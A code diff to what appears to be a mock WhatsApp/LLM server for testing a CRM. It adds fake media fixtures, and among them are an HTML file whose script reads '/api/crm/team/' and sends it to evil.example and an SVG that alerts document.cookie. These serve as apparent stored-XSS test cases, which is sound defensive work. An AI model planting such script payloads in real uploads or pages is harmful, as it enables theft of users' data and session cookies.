@@ -84,6 +84,14 @@ const TEMPLATES = [
   { name: "pendente", language: "pt_BR", status: "PENDING", category: "MARKETING", components: [] },
 ];
 
+// WhatsApp media a lead "sent" (GET /vX/<id> → its URL and type, then the bytes):
+// a photo, and files whose type would run scripts if a browser rendered them.
+const MEDIA = {
+  "media-jpg": { mime: "image/jpeg", body: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46]) },
+  "media-html": { mime: "text/html", body: Buffer.from("<script>fetch('/api/crm/team/').then(r=>r.text()).then(t=>fetch('https://evil.example/?'+t))</script>") },
+  "media-svg": { mime: "image/svg+xml", body: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>') },
+};
+
 http
   .createServer((req, res) => {
     let body = "";
@@ -113,6 +121,13 @@ http
           stop_sequence: null,
           usage: { input_tokens: Math.ceil(prompt.length / 4), output_tokens: Math.ceil(text.length / 4) },
         });
+      }
+      const mediaMeta = req.method === "GET" && req.url.match(/^\/v\d+\.\d+\/(media-[a-z]+)$/);
+      if (mediaMeta && MEDIA[mediaMeta[1]]) return json(200, { url: `http://localhost:${PORT}/media-file/${mediaMeta[1]}`, mime_type: MEDIA[mediaMeta[1]].mime });
+      const mediaFile = req.method === "GET" && req.url.match(/^\/media-file\/(media-[a-z]+)$/);
+      if (mediaFile && MEDIA[mediaFile[1]]) {
+        res.writeHead(200, { "Content-Type": MEDIA[mediaFile[1]].mime });
+        return res.end(MEDIA[mediaFile[1]].body);
       }
       if (req.method === "GET" && req.url.includes("message_templates")) return json(200, { data: TEMPLATES });
       if (req.method === "GET") {
